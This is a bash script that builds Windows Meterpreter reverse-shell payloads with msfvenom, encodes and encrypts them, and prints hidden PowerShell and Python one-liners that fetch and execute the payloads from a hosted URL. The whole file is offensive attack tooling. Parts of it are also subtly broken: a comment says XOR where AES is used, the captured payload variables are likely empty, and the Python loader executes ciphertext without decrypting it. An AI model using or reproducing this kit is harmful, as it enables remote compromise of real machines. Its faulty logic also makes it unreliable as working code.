#!/bin/bash

# Set the target IP and port
target_ip="192.168.1.1"
target_port="4444"

# Set the output directory
output_dir="./payloads"

# Set the URL where the payloads will be hosted
payload_url="http://example.com/payloads"

# Set the filename for the PowerShell and Python payloads
ps_filename="payload.ps1"
py_filename="payload.py"

# Create the output directory if it doesn't exist
if [ ! -d "$output_dir" ]; then
  mkdir -p "$output_dir"
fi

# Generate a PowerShell payload using MSFVenom
echo "Generating PowerShell payload..."
ps_payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$target_ip LPORT=$target_port -f psh -o "$output_dir/$ps_filename")

# Encode the PowerShell payload using Base64 and write it to a file
echo "Encoding PowerShell payload..."
echo "$ps_payload" | base64 -w0 > "$output_dir/$ps_filename.b64"

# Generate a Python payload using MSFVenom
echo "Generating Python payload..."
py_payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$target_ip LPORT=$target_port -f raw -o "$output_dir/$py_filename")

# Encode the Python payload using XOR and write it to a file
echo "Encoding Python payload..."
key=$(openssl rand -hex 16)
echo "Key: $key"
echo "$py_payload" | openssl enc -e -aes-256-cbc -K "$key" -iv 0 -nosalt | xxd -p | tr -d '\n' > "$output_dir/$py_filename.enc"
echo "$key" > "$output_dir/key.txt"

# Generate the PowerShell command to download and execute the payload
ps_command="powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand \$(Invoke-WebRequest -Uri '$payload_url/$ps_filename.b64' -UseBasicParsing).Content | Out-Null;"

# Generate the Python command to download and execute the payload
py_command="python -c \"import urllib.request, io, os; exec(bytearray.fromhex(urllib.request.urlopen('$payload_url/$py_filename.enc').read().decode('utf-8')));\""

# Print the commands to the console
echo "PowerShell Command: $ps_command"
echo "Python Command: $py_command"

echo "Payloads and commands generated successfully."
